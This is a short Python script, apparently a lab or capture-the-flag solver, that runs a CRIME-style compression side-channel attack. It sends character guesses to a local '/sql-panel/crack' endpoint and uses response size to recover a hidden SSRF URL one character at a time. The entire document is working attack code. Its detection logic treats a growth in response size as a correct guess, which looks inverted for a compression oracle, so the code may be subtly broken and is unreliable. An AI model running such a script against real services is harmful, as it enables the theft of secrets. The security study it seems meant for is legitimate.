import requests
import string
import time

BASE_URL = "http://localhost:5000/sql-panel/crack?data="
CHARSET = string.ascii_letters + string.digits + ":/?._-=&"
THRESHOLD = 1  # Number of bytes to detect an increase
MAX_LEAK_LEN = 100  # Reasonable length for SSRF URL

def get_size(payload):
    url = f"{BASE_URL}{payload}"
    r = requests.get(url)
    return len(r.content)

def detect_leak():
    known = ""
    base_size = get_size("")
    print(f"[i] Base response size: {base_size}")
    time.sleep(0.2)

    for i in range(MAX_LEAK_LEN):
        found = False
        for c in CHARSET:
            guess = known + c
            size = get_size(guess)
            if size - base_size >= THRESHOLD:
                known += c
                base_size = size
                found = True
                break
        if not found:
            break

    return known if known else None

if __name__ == "__main__":
    print("[*] Launching CRIME attack to recover SSRF URL...")
    leaked = detect_leak()
    if leaked:
        print(f"\n[+] Final SSRF URL: {leaked}")
    else:
        print("[-] Leak not detected.")
